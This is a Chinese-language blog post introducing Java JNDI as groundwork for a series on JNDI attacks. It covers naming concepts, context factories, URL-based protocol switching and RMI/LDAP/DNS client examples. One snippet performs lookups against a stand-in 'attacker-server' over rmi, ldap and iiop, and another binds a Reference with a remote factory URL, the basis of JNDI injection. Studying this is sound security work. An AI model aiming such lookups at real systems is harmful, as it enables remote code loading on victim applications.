---
title: "攻击Java中的JNDI、RMI、LDAP(一)"
date: 2020-03-05T15:34:28+08:00
draft: false
tags:
- Java
- 反序列化
series:
-
categories:
- 代码审计
---

学习JNDI、RMI、JRMP
<!--more-->
## 关于JNDI
JNDI(Java Naming and Directory Interface)是Java提供的Java 命名和目录接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。JNDI是Java EE的重要部分，需要注意的是它并不只是包含了DataSource(JDBC 数据源)，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA，摘自百度百科。

命名服务的相关概念：
1. Naming Service 命名服务
命名服务将名称和对象进行关联，提供通过名称找到对象的操作。
例如：DNS系统将计算机名和IP地址进行关联。文件系统将文件名和文件句柄进行关联等等。

2. Name  名称
要在命名系统中查找对象，需要提供对象的名称。对象的名称是用来标识该对象的易于人理解的名称。
例如：文件系统用文件名来标识文件对象。DNS系统用机器名来表示IP地址。

3. Binding 绑定
一个名称和一个对象的关联称为一个绑定。
例如：文件系统中，文件名绑定到文件。DNS系统中，机器名绑定到IP地址。

4. Reference 引用
在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。

5. Context 上下文
一个上下文是一系列名称和对象的绑定的集合。一个上下文通常提供一个lookup操作来返回对象，也可能提供绑定，解除绑定，列举绑定名等操作。

## 创建JNDI
看一个模板
```java
public static void main(String[] args) {
    // 创建环境变量
    Properties env = new Properties();
    // JNDI初始化工厂类
    env.put(Context.INITIAL_CONTEXT_FACTORY, "工厂类");
    // JNDI提供服务的URL
    env.put(Context.PROVIDER_URL, "url");
    try {
        // 创建JNDI服务对象
        DirContext context = new InitialDirContext(env);
    } catch (NamingException e) {
        e.printStackTrace();
    }
}
```
JNDI会自动搜索系统属性(System.getProperty())、applet 参数和应用程序资源文件(jndi.properties)。

`Context.INITIAL_CONTEXT_FACTORY`是JNDI服务的具体名字，比如`com.sun.jndi.dns.DnsContextFactory`是DNS服务对应的类名。具体服务对应的类名请自行在如图目录中寻找。

![image](https://y4er.com/img/uploads/20200305153109.png)

在com.sun.jndi.dns.DnsContextFactory中实现了InitialContextFactory，也就是说你可以通过实现javax.naming.spi.InitialContextFactory接口来创建自己的JNDI服务。javax.naming.spi.InitialContextFactory的结构如下。
```java
public interface InitialContextFactory {
    public Context getInitialContext(Hashtable<?,?> environment)
        throws NamingException;
}
```
## JNDI的动态协议转换
JNDI还有一个很重要的特点就是通过url的形式进行协议之间的转换，它可以在RMI、LDAP、CORBA等协议之间自动转换。例如
```java
Context ctx = new InitialContext();
ctx.lookup("rmi://attacker-server/refObj");
//ctx.lookup("ldap://attacker-server/cn=bar,dc=test,dc=org");
//ctx.lookup("iiop://attacker-server/bar");
```
即使你使用了RMI的工厂类初始化的Context，当lookup时也会根据传入的url来转换协议。我们跟进lookup看下
```java
public Object lookup(String name) throws NamingException {
    return getURLOrDefaultInitCtx(name).lookup(name);
}
```
跟进getURLOrDefaultInitCtx
```java
protected Context getURLOrDefaultInitCtx(String name)
    throws NamingException {
    if (NamingManager.hasInitialContextFactoryBuilder()) {
        return getDefaultInitCtx();
    }
    String scheme = getURLScheme(name);
    if (scheme != null) {
        Context ctx = NamingManager.getURLContext(scheme, myProps);
        if (ctx != null) {
            return ctx;
        }
    }
    return getDefaultInitCtx();
}
```
首先进行NamingManager.hasInitialContextFactoryBuilder()判断是否构建了初始化上下文工厂，跟进后发现返回空
![image](https://y4er.com/img/uploads/20200305152764.png)
然后进入getURLScheme获取协议
![image](https://y4er.com/img/uploads/20200305154208.png)
截取协议字符串，然后进入NamingManager.getURLContext(scheme, myProps)来初始化Context，最终跟进到jdk1.8.0_202/src.zip!/javax/naming/spi/NamingManager.java:592
![image](https://y4er.com/img/uploads/20200305153156.png)
在这里用协议名拼接了工厂类名，进而初始化了一个RMI的Context。

JNDI默认支持自动转换的协议有：

| 协议名称             |   协议URL    | Context类                                             |
| -------------------- | :----------: | ----------------------------------------------------- |
| DNS协议              |    dns://    | com.sun.jndi.url.dns.dnsURLContext                    |
| RMI协议              |    rmi://    | com.sun.jndi.url.rmi.rmiURLContext                    |
| LDAP协议             |   ldap://    | com.sun.jndi.url.ldap.ldapURLContext                  |
| LDAP协议             |   ldaps://   | com.sun.jndi.url.ldaps.ldapsURLContextFactory         |
| IIOP对象请求代理协议 |   iiop://    | com.sun.jndi.url.iiop.iiopURLContext                  |
| IIOP对象请求代理协议 | iiopname://  | com.sun.jndi.url.iiopname.iiopnameURLContextFactory   |
| IIOP对象请求代理协议 | corbaname:// | com.sun.jndi.url.corbaname.corbanameURLContextFactory |


## JNDI和不同服务的配合使用
JNDI的存在其实是为了协同其他应用来进行远程服务，它可以在客户端和服务端中都进行一些工作，其目的是为了将应用统一管理。比如在RMI服务端中，JNDI可以进行bind、rebind等操作，在客户端上可以进行lookup、list等操作，这样可以不直接使用RMI的Registry的bind，加上JNDI的动态协议解析，从而方便统一管理各个应用。

### JNDI DNS
使用DNS来做一个例子。
```java
package com.longofo.jndi;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.Attributes;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Properties;

public class DNSClient {
    public static void main(String[] args) {
        // 创建环境变量
        Properties env = new Properties();
        // JNDI初始化工厂类
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.dns.DnsContextFactory");
        // JNDI提供服务的URL
        env.put(Context.PROVIDER_URL, "dns://8.8.8.8");
        try {
            // 创建JNDI目录服务对象
            DirContext context = new InitialDirContext(env);

            // 获取DNS解析记录测试
            Attributes attrs1 = context.getAttributes("baidu.com", new String[]{"A"});
            Attributes attrs2 = context.getAttributes("qq.com", new String[]{"A"});

            System.out.println(attrs1);
            System.out.println(attrs2);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}
```
输出`{a=A: 104.198.14.52}`，RMI和LDAP的大同小异。

### JNDI RMI
```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL,"rmi://localhost:9999");
Context ctx = new InitialContext(env);

//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定
ctx.bind("refObj", new RefObject());

//通过名称查找对象
ctx.lookup("refObj");
```
### JNDI LDAP
```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:1389");

DirContext ctx = new InitialDirContext(env);

//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了
Object local_obj = ctx.lookup("cn=foo,dc=test,dc=org");
```

## JNDI命名引用
Java使用序列化来传输对象数据，当序列化对象过大或者一些其他不适合序列化来传输的情况时，出现了命名引用传递。对象通过命名管理器解码以引用的方式间接存储在命名或目录服务中。
```java
Reference reference = new Reference("MyClass","MyClass",FactoryURL);
ReferenceWrapper wrapper = new ReferenceWrapper(reference);
ctx.bind("Foo", wrapper);
```
**这个地方有大坑，以后再说。**

## 小结
本文简单介绍了JNDI，下一篇文章将会具体讲解如何攻击JNDI。

## 参考链接
1. [Java技术回顾之JNDI：命名和目录服务基本概念](https://blog.csdn.net/ericxyy/article/details/2012287)
2. [Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）](https://paper.seebug.org/1091)
3. https://javasec.org/javase/JNDI/
4. [深入理解JNDI注入与Java反序列化漏洞利用](https://kingx.me/Exploit-Java-Deserialization-with-RMI.html)
5. https://xz.aliyun.com/t/7079
6. Java安全漫谈.pdf
7. https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**